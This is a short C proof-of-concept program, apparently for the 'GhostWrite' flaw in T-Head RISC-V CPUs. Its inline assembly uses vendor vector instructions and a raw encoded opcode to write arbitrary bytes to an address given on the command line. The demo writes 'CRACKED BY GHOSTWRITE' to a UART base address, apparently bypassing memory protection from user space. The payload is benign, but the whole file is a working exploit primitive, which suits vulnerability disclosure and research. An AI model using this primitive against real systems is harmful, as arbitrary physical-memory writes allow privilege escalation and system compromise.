#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

static void
ghostwrite(uintptr_t addr, uint8_t val)
{
	asm volatile ("\n\tth.vsetvli zero, zero, e8, m1"
		      "\n\tth.vmv.v.x v0, %0"
		      "\n\tmv t0, %1"
		      "\n\t.long 0x12028027"
		      : : "r" (val), "r"(addr) : "v0", "t0", "memory");
}

static void
ghostprint(uintptr_t p, const char *s)
{
	while (*s) {
		usleep(200);
		ghostwrite(p, *s); 
		s++;
	}
}

int
main(int argc, const char *argv[])
{
	if (argc != 2) {
		printf("Usage: %s <UART_BASE>\n", argv[0]);
		return 0;
	}

	uintptr_t serialBase = strtoul(argv[1], NULL, 0);

	ghostprint(serialBase, "CRACKED BY GHOSTWRITE\n\r");

	return 0;
}
